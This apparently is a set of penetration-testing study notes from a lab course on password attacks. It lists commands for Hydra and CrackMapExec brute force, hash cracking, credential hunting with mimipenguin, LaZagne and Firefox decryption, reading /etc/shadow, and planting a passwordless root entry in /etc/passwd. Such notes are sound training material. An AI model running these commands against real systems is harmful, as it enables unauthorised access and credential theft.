

---
---

> Cracking Hash

```c
# Identify The Hash
┌──(root㉿offsec)-[/home/offsec/Downloads]
└─# hash-identifier 
┌──(root㉿offsec)-[/home/offsec/Downloads]
└─# hashid

# Cracking Using John The Ripper
c4ndy@htb[/htb]$ john --format=<hash_type> <hash or hash_file>
# Cracking With Rules
john --wordlist=wordlist.txt --rules=Custom --format=<hash-format> <hashfile>
# Cracking Files With John
cry0l1t3@htb:~$ <tool> <file_to_crack> > file.hash
```

> Network Services

```c
#  Crackmapexec x winrm
c4ndy@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list
# Hydra x SSH 
c4ndy@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
# Hydra x RDP 
c4ndy@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
# Hydra x SMB
c4ndy@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
```

> Password Mutations

```c
# Generating Rule-based Wordlist
$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
$ cat mut_password.list
```

> Using Cewl

```c
$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

> Credential Hunting In Linux

```bash
# Search for the Configuraiton FIles
for l in $(echo ".conf .config .cnf .bak .dat");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Credentials in Configuration Files
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

# Search For Notes
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# Search For Scripts
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

# CronJobs
cat /etc/crontab 
ls -la /etc/cron.*/

# Search For SSH  Private Keys
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

# Search For SSH Public Keys
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

# Search For History
cat -n5 /home/*/.bash*

# Search For Logs
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

# Memory And Cache  - TOOL 
sudo python3 mimipenguin.py
sudo python2.7 laZagne.py all

# Firerox Stored Credntials
cd ~
ls -l .mozilla/firefox/ | grep default 

# Decrypting Firefox Credentials
python3.9 firefox_decrypt.py
```

> Passwd , Shadow & Opasswd

```c
# if i am able to edit /etc/passwd
root::0:0:root:/root:/bin/bash
# Now the root is without password
[offsec@c4ndy]─[~]$ su

# if ia am able to edit /etc/shadow
If the password field contains a character, such as `!` or `*`, the user cannot log in with a Unix password. However, other authentication methods for logging in, such as Kerberos or key-based authentication, can still be used. The same case applies if the `encrypted password` field is empty. This means that no password is required for the login. However, it can lead to specific programs denying access to functions. The `encrypted password` also has a particular format by which we can also find out some information:

# Generate openssl password 
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2

# if i am able only to read /etc/passwd & /etc/shadow

sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

we can use john to crack
john unshadow.hashes

hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked # Add Custom Rule : ) 
```

> Protected Files

```bash
# Hunting For FIles
for ext in $(echo ".xls .xls* .xltx .csv .od* .kdbx .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Hunting For SSH Keys
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"

# Hunting For Encrypted SSH Keys
cat /home/cry0l1t3/.ssh/SSH.private

# Cracking With John  - locate *2john*
ssh2john.py SSH.private > ssh.hash

# Document Cracking
office2john.py Protected.docx > protected-docx.hash

# Cracking THe Hash , don't forget to add custom rule : ) 
john --wordlist=rockyou.txt protected-docx.hash
```

> Download All file extenstions

```c
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

> crack `.kdbx` files , 

```c
# Crack the File
keepass2john file.kdbx > hash.txt
john hash.txt --wordlist=/usr/share/wordlist/rockyou.txt
# open the Database 
open keepass2 or keepassXC and enter the password : ')
```

---
---

